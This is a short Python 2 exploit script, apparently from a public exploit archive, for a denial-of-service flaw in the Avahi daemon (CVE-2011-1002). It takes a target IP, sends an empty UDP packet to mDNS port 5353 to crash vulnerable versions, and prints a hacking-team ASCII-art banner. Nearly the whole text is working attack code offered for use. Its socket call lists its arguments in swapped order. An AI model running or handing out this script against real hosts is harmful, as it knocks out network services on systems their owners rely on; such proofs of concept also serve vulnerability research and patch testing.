#!/usr/bin/env python
#Exploit Title: Avahi 0.6.28 Denial of Service Vulnerability
#Date: 3/3/2011
#Author: MaYaSeVeN
#Blog: http://mayaseven.blogspot.com
#Video : [PoC] http://www.youtube.com/user/mayaseven
# Version: avahi <= 0.6.28
# Tested on: Debian 6(Squeeze)&Ubuntu 10.10
# CVE : CVE-2011-1002
import socket,sys
if len(sys.argv) != 2:
    print "Usage : avahi_DoS.py {Target IP}"
    sys.exit(1)
input = sys.argv[1]
sock = socket.socket(socket.SOCK_DGRAM,socket.AF_INET)
sock.sendto('',(input,5353))
print"  ,--^----------,--------,-----,-------^--,;"
print"  | |||||||||   `--------'     |          O    ... CWH Underground Hacking Team .."
print"  `+---------------------------^----------|                        By MaYaSeVeN"
print"    `\_,-------, _________________________|    [!] Thanks: c1ph3r"
print"      / XXXXXX /`|     /"
print"     / XXXXXX /  `\   /"
print"    / XXXXXX /\______("
print"   / XXXXXX /    " 
print"  / XXXXXX /"
print" (________("           
print"  `------'"
print "Exploit completed"